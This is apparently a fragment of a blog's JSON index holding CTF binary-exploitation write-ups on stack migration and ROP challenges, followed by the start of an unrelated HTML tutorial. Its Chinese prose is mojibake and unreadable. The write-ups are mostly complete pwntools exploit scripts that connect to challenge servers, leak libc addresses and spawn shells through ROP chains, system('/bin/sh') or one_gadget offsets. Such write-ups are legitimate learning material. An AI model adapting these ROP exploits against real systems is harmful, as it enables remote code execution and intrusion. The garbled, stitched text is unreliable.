æ”»å‡»æ€è·¯ç¨‹åºä¸­æœ‰ç€openï¼Œreadï¼Œputså‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªropé“¾ï¼Œè°ƒç”¨openå‡½æ•°ï¼Œæ§åˆ¶å…¶å‚æ•°æ˜¯./flagï¼Œå¹¶åœ¨gdbä¸­è°ƒè¯•å°†å…¶è¿”å›çš„æ–‡ä»¶fdå·è®°å½•ä¸‹æ¥ï¼Œç„¶åä¼ é€’ç»™readå‡½æ•°ï¼Œè®©å…¶è¯»å…¥æ–‡ä»¶å†…å®¹å­˜å…¥æŸä¸ªç¼“å†²åŒºï¼Œå†ç”¨putså‡½æ•°è¾“å‡ºä¸€ä¸‹flagæ–‡ä»¶çš„å†…å®¹å³å¯ã€‚åœ¨ç¬¬ä¸€ä¸ªreadçš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±éœ€è¦å†™å¥½ropé“¾ã€‚ç„¶ååœ¨æœ€åä¸€ä¸ªreadå‡½æ•°æ—¶ï¼Œæ§åˆ¶å¥½ebpæŒ‡å‘æˆ‘ä»¬çš„æ–°æ ˆã€‚ EXPfrom pwn import * context.log_level = &apos;debug&apos; context.arch = &apos;amd64&apos; # io = process(&apos;./ROP&apos;) io = remote(&apos;47.103.214.163&apos;,20300) e = ELF(&apos;./ROP&apos;) buf = 0x06010A0 # libc = e.libc padding = 80 leave_ret = 0x040090d pop_rdi_ret = 0x00400a43 pop_rsi_r15 = 0x00400a41 open_plt = 0x4007b0 read_plt = 0x400780 puts_plt = 0x400760 io.recvuntil(&apos;think so?\\n&apos;) p = flat([&apos;./flag\\x00\\x00&apos;,pop_rdi_ret,buf,pop_rsi_r15,0,0,open_plt,pop_rdi_ret,4,pop_rsi_r15,buf+0x80,0,read_plt,pop_rdi_ret,buf+0x80,puts_plt]) io.sendline(p) io.recvuntil(&apos;\\n&apos;) p = padding * &apos;a&apos; + p64(buf) + p64(leave_ret) raw_input(&apos;-&gt;&apos;) #æ‰‹åŠ¨ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œä»¥åè®©gdbé™„åŠ ä¸Šè¿›è¡Œè°ƒè¯• io.send(p) flag = io.recvline_contains(&apos;hgame&apos;) print(flag) io.interactive()æˆ‘ä»¬è·Ÿç€expæ¥è°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹æ•ˆæœï¼šæ­¤æ—¶çš„espæ˜¯æˆ‘ä»¬ä¼ªé€ çš„new espï¼Œå·²ç»æŒ‡å‘äº†æˆ‘ä»¬çš„ç›®æ ‡ä½ç½®ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªropé“¾æ¥å·²ç»é€è¿‡å»ï¼Œå¯ä»¥çœ‹åˆ°./flagçš„å­—çœ¼ã€‚æ‰§è¡Œä¸€ä¸‹leaveï¼šå¯ä»¥çœ‹åˆ°rbpçš„å€¼å·²ç»ç­‰äºæˆ‘ä»¬ä¼ªé€ çš„å€¼ï¼Œespè¿˜åœ¨åŸæ¥æ ˆä¸Šã€‚æ¥ç€æ‰§è¡Œretï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªleave retï¼šå…ˆè®°å½•ä¸‹å½“å‰çš„çŠ¶æ€ï¼Œå¼€å§‹æ‰§è¡Œleaveï¼šæ‰§è¡Œå®Œå‘ç°espå·²ç»åˆ°è¾¾äº†æ–°æ ˆbuf+8çš„ä½ç½®ï¼Œæ­¤æ—¶çš„æ ˆå¸§å·²ç»æ˜¯æˆ‘ä»¬å®Œå…¨æƒ³è¦çš„ï¼Œå·²ç»åŠ«æŒäº†ç¨‹åºæµç¨‹ï¼Œå¹¶ä¸”æ–°æ ˆç©ºé—´å¾ˆå¤§ï¼Œå¯ä»¥æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ã€‚ebpæ˜¯å¤šå°‘å·²ç»ä¸é‡è¦äº†ï¼Œæˆ‘ä»¬ç›´æ¥å¡«å…¥./flagï¼Œè¿™ä¸ªå›ºå®šåœ°å€ä¹Ÿåšä¸ºç»™openå‡½æ•°åšå‚æ•°ã€‚åœ¨è°ƒè¯•çš„æ—¶å€™ï¼Œæ‰§è¡Œå®Œopenå‡½æ•°éœ€è¦æŠŠè¿”å›çš„fdå€¼è®°å½•ä¸‹ï¼Œç»™readå‡½æ•°åšå‚æ•°ã€‚æœ€åç”±putså‡½æ•°åœ¨è¾“å‡ºflagï¼š Stack Migrationå°æ€»ç»“ è¿™ä¸‹å¯ä»¥æ€»ç»“ä¸‹åˆ©ç”¨æ€è·¯ä¹Ÿå°±æ˜¯ æŠŠæ§å¥½èµ·åˆæ ˆçš„ebpï¼Œåœ¨é‡Œé¢å†™å…¥éœ€è¦ä¼ªé€ çš„new esp åœ¨ä¹‹åçš„å¯åˆ©ç”¨å­—èŠ‚ä¸­å†™å…¥leave gadget å°†æƒ³æ‰§è¡Œçš„ROP Chainå†™åœ¨å·²çŸ¥å›ºå®šä½ç½®ä¸Š å†åˆ©ç”¨leaveæ¬ç§»Stackä½ç½®åˆ°å·²çŸ¥ä½ç½® ç„¶åæ— é™æ¥ROP Chain","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"å­¦ä¹ è®°å½•","slug":"å­¦ä¹ è®°å½•","permalink":"http://chumen77.xyz/tags/å­¦ä¹ è®°å½•/"},{"name":"Stack Migration","slug":"Stack-Migration","permalink":"http://chumen77.xyz/tags/Stack-Migration/"}]},{"title":"ROPé¢˜ç›®ç»ƒä¹ ","slug":"ROPç»ƒä¹ ","date":"2020-02-03T08:21:13.000Z","updated":"2020-06-22T03:57:18.281Z","comments":true,"path":"2020/02/03/ROPç»ƒä¹ /","link":"","permalink":"http://chumen77.xyz/2020/02/03/ROPç»ƒä¹ /","excerpt":"","text":"ROPé¢˜ç›®ç»ƒä¹ å‰è¨€æœ€è¿‘åœ¨å­¦ä¹ æ ˆæº¢å‡ºï¼Œåšäº†ä¸€äº›ROPçš„ç»ƒä¹ é¢˜ï¼ŒåŸºæœ¬éƒ½æ˜¯buuojçš„é¢˜ç›®ï¼Œæœç´¢ropå­—çœ¼æ‰¾çš„ropé¢˜ã€‚ç®€å•è®°å½•ä¸€ä¸‹æ”¶è·å’Œexpã€‚ æœ‰libcï¼ˆæˆ–è€…æ— libcå¯åšï¼‰OGeek2019_babyropæŸ¥ä¿æŠ¤å’Œarch32ä½ç¨‹åºï¼Œå¼€å¯NXå †æ ˆä¸å¯æ‰§è¡Œã€‚ idaåˆ†æå¯ä»¥çœ‹å‡ºå…¶å–äº†ä¸€ä¸ªéšæœºæ•°ï¼Œå­˜å…¥bufã€‚ç„¶åè¿›å…¥è¿™ä¸ªå‡½æ•°åˆ†æï¼Œçœ‹åˆ°æ¥æ”¶bufä¼ æ¥çš„å€¼ï¼Œæ”¾å…¥sä¸­ã€‚ç„¶åä¸‹é¢æ¥æ”¶ä½ ä¼ å…¥çš„ä¸œè¥¿ï¼Œä¸såˆ¤æ–­æ˜¯å¦ç›¸åŒï¼Œä¸ç›¸åŒå°±ä¼šé€€å‡ºã€‚ç„¶åå¦‚æœä¸é€€å‡ºè¿”å›å€¼æ˜¯v5ï¼Œä½†æ˜¯è¿™é‡Œçš„v5åœ¨å‡½æ•°ä¸­æ˜¯æ²¡æœ‰ç»è¿‡å¤„ç†çš„ã€‚çœ‹ä¸€ä¸‹æ±‡ç¼–ï¼šv5å’±ä»¬æƒ³æ§åˆ¶ï¼Œå°±åªèƒ½é€šè¿‡åŸæ¥é‚£ä¸ªreadå‡½æ•°ï¼Œå’±ä»¬ä¼ å…¥çš„å€¼å»æ§åˆ¶ã€‚è¿”å›å€¼ç»™v2ï¼Œç„¶åv2ä½œä¸ºå‚æ•°ç„¶åè¿›å…¥ä¸‹é¢è¿™ä¸ªå¸¦æœ‰æº¢å‡ºçš„å‡½æ•°ä¸­ã€‚ è§‚å¯Ÿåï¼Œå¯ä»¥çœ‹å‡ºå’±ä»¬åº”è¯¥æŠŠè¿™ä¸ªè¿”å›çš„å‚æ•°æ•´çš„å¤§ä¸€ç‚¹ï¼Œæ–¹ä¾¿è¿›è¡Œå†™ROPé“¾ã€‚ åˆ†ææ€»ç»“å…¶ä¸­å¯¹äºç»•è¿‡ç›¸ç­‰åˆ¤æ–­ï¼Œå¯ä»¥åˆ©ç”¨ä¸€ä¸‹strlenå‡½æ•°çš„ç‰¹æ€§ï¼Œç„¶åç›´æ¥ç”¨\\x00æ¥æˆªæ–­ã€‚v5è¿™ä¸ªè¿”å›å‚æ•°å¯ä»¥æ§åˆ¶ä¸ºâ€™\\xffâ€™,ç„¶åè¿›å…¥å¸¦æœ‰æº¢å‡ºçš„å‡½æ•°ï¼Œå†™ropé“¾å°±è¡Œäº†ã€‚å…ˆç”¨putså‡½æ•°æ³„éœ²å‡º__libc_start_mainçš„åœ°å€ï¼Œç„¶ååœ¨ç»™çš„libcä¸­ç¡®è®¤ä¸‹symbolsï¼Œç„¶åæ‹¿åˆ°libcåŸºå€ï¼Œç„¶åç›´æ¥åˆ©ç”¨one gadget RCEå³å¯ã€‚ expfrom pwn import * import time # io = process('./pwn') io = remote('node3.buuoj.cn',27780) libc = ELF('./libc-2.23.so') # blibc = ELF('/lib/i386-linux-gnu/libc-2.23.so') elf = ELF('./pwn') # raw_input('-&gt;') p1 = '\\x00'.ljust(8,'\\xff') offset = 0xe7 + 4 io.send(p1 + '\\n') io.recvline_contains('Correct') start_add=0x080485A0 put_add = elf.symbols['puts'] libc_start_add = elf.got['__libc_start_main'] rop1 = [ put_add, start_add, libc_start_add ] p2 = offset * '\\x00' + ''.join(map(p32,rop1)) io.sendline(p2) sleep(1) libc_base = u32(io.recv(4)) - libc.symbols['__libc_start_main'] REC = libc_base+0x3a80c print('libc_base :'+hex(libc_base)) offset = 0xe7 + 4 io.send(p1 + '\\n') io.recvline_contains('Correct') p3 = offset * '\\x00' + p32(REC) io.sendline(p3) io.interactive() HarekazeCTF2019_baby_ropæŸ¥ä¿æŠ¤å’Œarch idaåˆ†æint __cdecl main(int argc, const char **argv, const char **envp) &#123; char v4; // [rsp+0h] [rbp-10h] system(\"echo -n \\\"What's your name? \\\"\"); __isoc99_scanf(\"%s\", &amp;v4); printf(\"Welcome to the Pwn World, %s!\\n\", &amp;v4); return 0; &#125; ç¨‹åºååˆ†ç®€å•ï¼Œç»™äº†systemå‡½æ•°ï¼Œä¸”æ˜æ˜¾å­˜åœ¨æº¢å‡ºã€‚idaæŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œè¯¥å¯ä»¥å‘ç°/bin/sh/ï¼Œè¿™æ„é€ ä¸ªç®€å•ropé“¾ç›´æ¥åˆ©ç”¨å°±å¥½äº†ã€‚ expfrom pwn import * import time # io = process('./babyrop') io = remote('node3.buuoj.cn',28633) elf = ELF('./babyrop') offset = 0x10 + 8 binsh_add = 0x0601048 pop_rdi_ret=0x000400683 system_add = elf.symbols['system'] # io.recvline_contains('your') # raw_input('-&gt;') p = 'a' * offset + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add) io.sendline(p) io.interactive() æ‹¿åˆ°shellåï¼Œè¿™ä¸ªé¢˜buuctfæ ¹ç›®å½•ä¸‹æ²¡æœ‰flagæ–‡ä»¶ã€‚éœ€è¦find / -name &quot;flag&quot; å¯ä»¥æŸ¥åˆ°æ˜¯åœ¨/home/babyrop/flagè¿™ä¸ªç›®å½•ä¸‹ã€‚ HarekazeCTF2019_baby_rop2æŸ¥ä¿æŠ¤å’Œarch idaåˆ†æå‡½æ•°è¿‡ç¨‹å¾ˆç®€å•ï¼Œæ˜æ˜¾æ ˆæº¢å‡ºï¼Œæ€è·¯å°±æ˜¯å…ˆæ ˆæº¢å‡ºæ„é€ ropé“¾ï¼Œè®©pintfå‡½æ•°æ‰“å°å‡º__libc_start_mainå‡½æ•°åœ¨å†…å­˜çš„åœ°å€ï¼Œç„¶ååœ¨ç»™çš„libcæ–‡ä»¶ä¸­è·å–ä¸€ä¸‹å…¶sympolæ˜¯çš„å€¼ï¼Œç„¶åå†è®¡ç®—å‡ºå®ƒçš„åŸºå€ï¼Œå†è®©å‡½æ•°è¿”å›åˆ°shartå¤„æ¸…ç†ä¸€ä¸‹æ ˆï¼Œç„¶åå†æ¬¡åˆ©ç”¨onegadget RCEæ„é€ ç›¸å…³ropé“¾å³å¯ã€‚ expfrom pwn import * import time io = process('./babyrop2') # blibc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so') # context.log_level = 'debug' libc = ELF('./libc.so.6') io = remote('node3.buuoj.cn',27694) elf = ELF('./babyrop2') offset = 40 __libc_start_add = elf.got['__libc_start_main'] start_add = 0x0400540 printf_add = elf.symbols['printf'] aWelcomeToThePw = 0x400770 pop_rdi_ret= 0x000400733 pop_rsi_r15_ret = 0x00400731 libc_start_sys = libc.symbols['__libc_start_main'] rop1 = [ pop_rdi_ret, aWelcomeToThePw, pop_rsi_r15_ret, __libc_start_add, 0, printf_add, start_add ] io.recvuntil('e? ') # io.recvuntil('again, ') # raw_input('-&gt;') p = 'a' * offset + ''.join(map(p64,rop1)) io.sendline(p) io.recvline_contains('again') s = io.recvline_contains('again') libc_base = int(u64(s[32:38].ljust(8,'\\x00'))) - libc_start_sys RCE = libc_base + 0x4526a print('libc_base:'+hex(libc_base)) io.recvuntil('name? ') # io.recvuntil('name? ') p = '\\x00' * offset + p64(RCE) + '\\x00' * 70 sleep(1) raw_input('-&gt;') io.sendline(p) io.interactive() æ— libcè¿™ä¸€éƒ¨åˆ†ç›®å‰ä¸»è¦æ˜¯åˆ©ç”¨LibcSearcheræ¥åšçš„ï¼Œæœ‰æ—¶å€™é¢˜ç›®ä¸ç»™libcï¼Œç”¨è¿™ä¸ªä¹Ÿå¯ä»¥è§£å†³éƒ¨åˆ†é¢˜ç›®ã€‚~~ç”¨è¿™ä¸ªä»¥åå°±ä¸èƒ½å¾ˆæ–¹ä¾¿çš„ç”¨onegadgetå»ä¸€é”®æ‹¿shelläº†ï¼Œæ„Ÿè§‰è¿˜æ˜¯æœ‰åŠæ³•çš„ï¼Œæƒ³åŠæ³•æ‹¿åˆ°LibcSearcherè·å–åˆ°çš„libcç‰ˆæœ¬å°±å¥½äº†ï¼Œæ‰¾ä¸ªæ—¶é—´å»å®è·µä¸€ä¸‹ï¼Œå…ˆæ…¢æ…¢æ„å»ºropé“¾å°±å¥½ï¼Œæ­£å¥½ç»ƒä¹ ä¸€ä¸‹è¿™ç§æ–¹æ³•æ‹¿shellã€‚~~å·²ç»æµ‹è¯•å‡ºåŠæ³•å’¯ã€‚https://github.com/lieanu/LibcSearcher bjdctf_2020_babyropæŸ¥ä¿æŠ¤å’Œarch idaåˆ†æå‡½æ•°ååˆ†ç®€å•ï¼Œæ˜æ˜¾æ ˆæº¢å‡ºï¼Œæ€è·¯å°±æ˜¯å…ˆæ ˆæº¢å‡ºæ„é€ ropé“¾ï¼Œè®©putså‡½æ•°æ‰“å°å‡º__libc_start_mainå‡½æ•°çš„åœ°å€ï¼Œç„¶åå†ç”¨libcsearcheræ¥è·å–ä¸€ä¸‹å®ƒçš„libcç‰ˆæœ¬ï¼Œç„¶åå†è®¡ç®—å‡ºå®ƒçš„åŸºå€ï¼Œå†è®©å‡½æ•°è¿”å›åˆ°æœ€åˆæ¸…ç†ä¸€ä¸‹æ ˆï¼Œç„¶åå†æ¬¡è¿›è¡Œæº¢å‡ºæ„é€ å…³äºsystem(&#39;/bin/sh&#39;)çš„ropé“¾å³å¯ã€‚ expfrom pwn import * from LibcSearcher import * import time # context.log_level = 'debug' io = remote('node3.buuoj.cn',28661) # io = process('./bjdctf_2020_babyrop') elf = ELF('./bjdctf_2020_babyrop') # blibc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so') io.recvuntil('story!\\n') padding = 40 libc_main_add = elf.got['__libc_start_main'] puts_add = elf.symbols['puts'] pop_rdi_ret = 0x0400733 p = 'a'*padding + p64(pop_rdi_ret) + p64(libc_main_add) + p64(puts_add) + p64(0x400530) io.sendline(p) s = u64(io.recv(6).ljust(8,'\\x00')) print(hex(s)) obj = LibcSearcher(\"__libc_start_main\",s) libc_base = s - obj.dump(\"__libc_start_main\") system_add = libc_base + obj.dump(\"system\") binsh_add = libc_base + obj.dump(\"str_bin_sh\") sleep(1) io.recvuntil('story!\\n') p = 'a'*padding + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add) io.sendline(p) io.interactive() unctf_easyropæŸ¥ä¿æŠ¤å’Œarch idaåˆ†æä¸»ç¨‹åºä¸»è¦å°±æ˜¯é™åˆ¶äº†v2éœ€è¦ç­‰äºffffæ‰èƒ½è¿›å…¥å¸¦æœ‰æº¢å‡ºçš„å‡½æ•°ï¼Œv2çš„å€¼æ˜¯è¿™ä¸ªåœ¨readçš„æ—¶å€™æŠŠæ§å¥½ï¼Œè®©ffffå¡«å…¥è¿™ä¸ªä½ç½®å³å¯ã€‚ç„¶åè¿›å…¥è¿™ä¸ªå¸¦æœ‰æº¢å‡ºæ¼æ´çš„å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°bufçš„é¦–åœ°å€æ˜¯ebp-0x10ï¼Œç„¶ååˆ†æä¸‹è¿™é‡Œçš„æ±‡ç¼–ï¼Œå®ƒæŠŠreadå‡½æ•°çš„æº¢å‡ºä½ç½®è¿”å›å€¼ebp-0x14å–å‡ºæ¥ï¼Œä¸0x8050000è¿›è¡Œæ¯”è¾ƒã€‚ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œæ˜¯é˜²æ­¢æˆ‘ä»¬è¿›è¡Œret2libcçš„ã€‚é‚£æˆ‘ä»¬æ„é€ è¿™é‡Œå¯ä»¥ç”¨ä¸€ä¸ªretæ¥è¿›è¡Œç»•è¿‡ã€‚ æ€è·¯æ€»ç»“å…ˆæ§åˆ¶å¥½v2è®©å…¶ç­‰äºffffï¼Œç„¶åè¿›å…¥å¸¦æœ‰æº¢å‡ºçš„å‡½æ•°ï¼Œç„¶åæ„é€ ropé“¾ï¼Œå…ˆæŠŠ__libc_start_mainçš„å†…å­˜åœ°å€æ³„éœ²å‡ºæ¥ï¼Œç„¶åç”¨libcseacheræ¥ç¡®å®šlibcç‰ˆæœ¬ï¼Œç„¶ådumpå‡º__libc_start_mainçš„sympols,ç®—å‡ºåŸºå€åï¼Œæ¥ç€è¿”å›åˆ°å¼€å§‹å¤„æ¸…ç†ä¸€ä¸‹æ ˆï¼Œå†æ¬¡æº¢å‡ºè·ŸåŸæ¥ä¸€æ ·ã€‚ç„¶åå†æ¬¡æ„é€ ropé“¾çš„æ—¶å€™ï¼Œæ³¨æ„retç»•è¿‡å¯¹å’±ä»¬æº¢å‡ºåœ°å€çš„æ£€æµ‹ï¼Œåœ¨è°ƒç”¨system(â€˜/bin/shâ€™)å³å¯ã€‚ expfrom pwn import * from LibcSearcher import * import time # context.log_level = 'debug' io = process('./easyrop') # io = remote('183.129.189.60',10011) io.recvuntil('TFer!\\n') e =ELF('./easyrop') raw_input('-&gt;') padding = 36 start_add = 0x08048400 libc_start_main = e.got['__libc_start_main'] puts_add = e.symbols['puts'] ret = 0x0804839e p = 'f' * padding rop1 = [ puts_add, start_add, libc_start_main ] io.sendline(p) io.recvuntil('name?\\n') p = '\\x00' * 0x18 + ''.join(map(p32,rop1)) raw_input('&gt;') io.sendline(p) libc_start_add = u32(io.recv(4)) obj = LibcSearcher(\"__libc_start_main\",libc_start_add) libc_base = libc_start_add - obj.dump(\"__libc_start_main\") print(libc_base) system_add = obj.dump('system') + libc_base binsh_add = obj.dump('str_bin_sh') + libc_base io.recvuntil('TFer!\\n') p = 'f' * padding io.sendline(p) io.recvuntil('name?\\n') rop2 = [ ret, system_add, start_add, binsh_add ] p = '\\x00' * 0x14 + ''.join(map(p32,rop2)) sleep(1) io.sendline(p) io.interactive() é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_ropæŸ¥ä¿æŠ¤å’Œarch32ä½ idaåˆ†æint __cdecl main(int argc, const char **argv, const char **envp) &#123; be_nice_to_people(); vulnerable_function(); return write(1, \"Hello, World\\n\", 0xDu); &#125; ä¸»å‡½æ•°å¾ˆç®€å•ï¼Œæ¼æ´å‡½æ•°æ˜¯åœ¨ç¬¬äºŒä¸ªå‡½æ•°ã€‚æ ˆæº¢å‡ºï¼Œç„¶åç›´æ¥æ„é€ ropé“¾å³å¯ã€‚åˆ©ç”¨æ€è·¯ï¼šç”¨wirteå‡½æ•°æ³„éœ²å‡º__libc_start_mainåœ¨å†…å­˜åœ°å€ï¼Œç„¶åè¿”å›startæ¸…ç†ä¸€ä¸‹æ ˆï¼Œç”¨libcseacherç¡®å®šä¸‹libcç‰ˆæœ¬ï¼Œç„¶åè¿›è¡Œæ„é€ system(â€˜/bin/shâ€™)çš„ropé“¾å³å¯ã€‚ è¿™ä¸ªæˆ‘æ˜¯å‘ç°å¯ä»¥ç”¨libcseacherç¡®å®šlibcç‰ˆæœ¬åï¼Œç”¨one_gadgetå·¥å…·è®¡ç®—RCEä½ç½®ï¼Œç„¶åå®ç°ret to RCEã€‚libcseacherè·å–åˆ°leakåœ°å€åï¼Œåœ¨æ‰§è¡Œdump libcå‰çš„æ—¶å€™ï¼Œä¼šå‘Šè¯‰ä½ ï¼Œå®ƒç¡®å®šçš„libcç‰ˆæœ¬å·æ˜¯å¤šå°‘ã€‚è¿™ä¸ªæ˜¯è®©ä½ é€‰æ‹©çš„ã€‚ åœ¨ä¸‹è½½çš„libcseacheræ—¶å€™ï¼Œå…¶å®å®ƒæ˜¯æœ‰ä¸ªæ•°æ®åº“çš„ï¼Œè¿™é‡Œé¢å­˜ç€å„ç§libcç‰ˆæœ¬ï¼Œæ–¹ä¾¿å’±ä»¬ä½¿ç”¨ã€‚é‚£è¿™ä¸ªæ—¶å€™ï¼Œç›´æ¥ç”¨one_gadget è®¡ç®—ä¸‹RCEåç§»å³å¯ã€‚ expfrom pwn import * from LibcSearcher import * context.log_level = 'debug' context.arch = 'i386' elf = ELF('./2018_rop') # io = process('./2018_rop') io = remote('node3.buuoj.cn',29692) padding = 140 write_plt = elf.symbols['write'] libc_start_main_got = elf.got['__libc_start_main'] start = 0x080483C0 p = padding * '\\x00' + flat([write_plt,start,1,libc_start_main_got,0x10]) # raw_input('-&gt;') io.sendline(p) libc_start_main_add = u32(io.recv(4)) obj = LibcSearcher('__libc_start_main',libc_start_main_add) libc_base = libc_start_main_add - obj.dump('__libc_start_main') system_add = libc_base + obj.dump('system') binsh_add = libc_base + obj.dump('str_bin_sh') # print(libc.symbols['__libc_start_main']) print(hex(libc_base)) # io.recvline() RCE = libc_base + 0x3cbec p = padding * '\\x00' + p32(RCE) + padding * '\\x00' # p = padding * '\\x00' + p32(system_add) + p32(start) + p32(binsh_add) io.sendline(p) io.interactive() è¿™é‡Œé¢ä¸¤ç§åŠæ³•éƒ½è¡Œã€‚ xdctf2015_pwn200æŸ¥ä¿æŠ¤å’ŒarchArch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) idaåˆ†æä¸»å‡½æ•°ååˆ†ç®€å•ï¼Œæ¼æ´åœ¨vulnå‡½æ•°ï¼špaddingä¸º 6c+4 ä¸ªå­—èŠ‚ã€‚è·Ÿä¸Šé¢˜å¾ˆåƒçš„æ”»å‡»æ€è·¯ï¼Œç›´æ¥ç»™expäº†ã€‚ expfrom pwn import * from LibcSearcher import * # io = process('./bof') io = remote('node3.buuoj.cn',27178) elf = ELF('./bof') libc = elf.libc context.arch = 'i386' context.log_level = 'debug' padding = 112 start_add = 0x080483E0 libc_start_main_got = elf.got['__libc_start_main'] write_plt = elf.symbols['write'] io.recvuntil('2015~!\\n') p = padding * '\\x00' + flat([write_plt,start_add,1,libc_start_main_got,0x10]) io.sendline(p) libc_start_main_add = u32(io.recv(4)) obj = LibcSearcher('__libc_start_main',libc_start_main_add) libc_base = libc_start_main_add - obj.dump('__libc_start_main') print(hex(libc_start_main_add)) print(hex(libc_base)) io.recvuntil('2015~!\\n') rce = libc_base + 0x3a80c p = padding * '\\x00' + p32(rce) + padding * '\\x00' io.sendline(p) io.interactive() è¿˜æ˜¯æœ¬åœ°æ¥baseåº“æŸ¥libcçš„one_gadgetï¼Œç„¶året to rceã€‚","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"ROP","slug":"ROP","permalink":"http://chumen77.xyz/tags/ROP/"}]},{"title":"HTML åŸºç¡€","slug":"HTML åŸºç¡€","date":"2019-12-29T13:42:51.000Z","updated":"2020-02-28T07:52:37.000Z","comments":true,"path":"2019/12/29/HTML åŸºç¡€/","link":"","permalink":"http://chumen77.xyz/2019/12/29/HTML åŸºç¡€/","excerpt":"","text":"HTML åŸºç¡€ HTMLæ ‡é¢˜ï¼šæ˜¯é€šè¿‡ &lt;h1&gt; - &lt;h6&gt; æ ‡ç­¾æ¥å®šä¹‰çš„.ï¼›å…¶ä¼šå› ä¸ºæ•°å­—å˜åŒ–è€Œæ˜¾ç¤ºçš„å­—ä½“å¤§å°å˜åŒ–ï¼› HTMLæ®µè½ï¼šé€šè¿‡æ ‡ç­¾&lt;p&gt; æ¥å®šä¹‰çš„. HTMLé“¾æ¥ï¼šé€šè¿‡æ ‡ç­¾&lt;a&gt;æ¥å®šä¹‰çš„ã€‚ HTMLå›¾åƒï¼šé€šè¿‡æ ‡ç­¾ &lt;img&gt; æ¥å®šä¹‰çš„ã€‚ HTML æ–‡æœ¬HTML æ ‡é¢˜æ ‡é¢˜ï¼ˆHeadingï¼‰æ˜¯é€šè¿‡&lt;h1&gt; - &lt;h6&gt; æ ‡ç­¾è¿›è¡Œå®šä¹‰çš„.&lt;h1&gt; å®šä¹‰æœ€å¤§çš„æ ‡é¢˜ã€‚ &lt;h6&gt;å®šä¹‰æœ€å°çš„æ ‡é¢˜ã€‚æµè§ˆå™¨ä¼šè‡ªåŠ¨åœ°åœ¨æ ‡é¢˜çš„å‰åæ·»åŠ ç©ºè¡Œã€‚ æ ‡é¢˜å¾ˆé‡è¦ï¼š ä¸è¦ä»…ä»…æ˜¯ä¸ºäº†ç”Ÿæˆç²—ä½“æˆ–å¤§å·çš„æ–‡æœ¬è€Œä½¿ç”¨æ ‡é¢˜ï¼Œè€Œæ˜¯==ä¸ºäº†ç”¨æˆ·å¯ä»¥é€šè¿‡æ ‡é¢˜æ¥å¿«é€Ÿæµè§ˆæ‚¨çš„ç½‘é¡µåº”è¯¥å°† h1 ç”¨ä½œä¸»æ ‡é¢˜==ï¼ˆæœ€é‡è¦çš„ï¼‰ï¼Œå…¶åæ˜¯ h2ï¼ˆæ¬¡é‡è¦çš„ï¼‰ï¼Œå†å…¶æ¬¡æ˜¯ h3ï¼Œä»¥æ­¤ç±»æ¨ã€‚ HTML æ³¨é‡Šæ³¨é‡Šï¼š å¼€å§‹æ‹¬å·ä¹‹åï¼ˆå·¦è¾¹çš„æ‹¬å·ï¼‰éœ€è¦ç´§è·Ÿä¸€ä¸ªå¹å·ï¼Œç»“æŸæ‹¬å·ä¹‹å‰ï¼ˆå³è¾¹çš„æ‹¬å·ï¼‰ä¸éœ€è¦ï¼Œåˆç†åœ°ä½¿ç”¨æ³¨é‡Šå¯ä»¥å¯¹æœªæ¥çš„ä»£ç ç¼–è¾‘å·¥ä½œäº§ç”Ÿå¸®åŠ©ã€‚ã€‚ &lt;!-- è¿™æ˜¯ä¸€ä¸ªæ³¨é‡Š --&gt; HTML æ®µè½æµè§ˆå™¨ä¼šè‡ªåŠ¨åœ°åœ¨æ®µè½çš„å‰åæ·»åŠ ç©ºè¡Œã€‚ï¼ˆ&lt;/p&gt;æ˜¯å—çº§å…ƒç´ ï¼‰ HTML æ°´å¹³çº¿1ï¼š&lt;hr&gt;æ ‡ç­¾åœ¨ HTML é¡µé¢ä¸­åˆ›å»ºæ°´å¹³çº¿ã€‚ HTML æ–‡æœ¬æ ¼å¼åŒ–é€šå¸¸ç”¨åˆ°&lt;strong&gt;&lt;em&gt;&lt;del&gt;è¿™å‡ ä¸ªæ ‡ç­¾ã€‚ ç»ƒä¹ ï¼š&lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;æ–‡æœ¬&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- &lt;h1&gt;æ ‡é¢˜1&lt;/h1&gt; &lt;h2&gt;æ ‡é¢˜2&lt;/h2&gt; &lt;h3&gt;æ ‡é¢˜3&lt;/h3&gt; &lt;h4&gt;æ ‡é¢˜4&lt;/h4&gt; &lt;h5&gt;æ ‡é¢˜5&lt;/h5&gt; &lt;h6&gt;æ ‡é¢˜6&lt;/h6&gt; --&gt; &lt;!-- &lt;h&gt;æ ‡ç­¾æœ‰å¤§å°ä¹‹åˆ† --&gt; &lt;h2&gt;äº”èŠ±å±±&lt;/h2&gt; &lt;p&gt;æˆ‘å®¶ä½åœ¨å¤§å±±é‡Œã€‚ä½ çŸ¥é“è¿™é‡Œçš„å±±æ˜¯ä»€ä¹ˆé¢œè‰²çš„å—ï¼Ÿ&lt;/p&gt; &lt;p&gt;æ˜¥å¤©çš„å±±æ˜¯ç»¿è‰²çš„ï¼Œé‚£ç»¿è‰²æ·¡æ·¡çš„ï¼Œè®¸å¤šæ ‘å¶åˆšå†’å‡ºèŠ½æ¥ï¼Œè¿˜å¸¦ç€å«©å«©çš„é»„è‰²å‘¢ã€‚&lt;/p&gt; 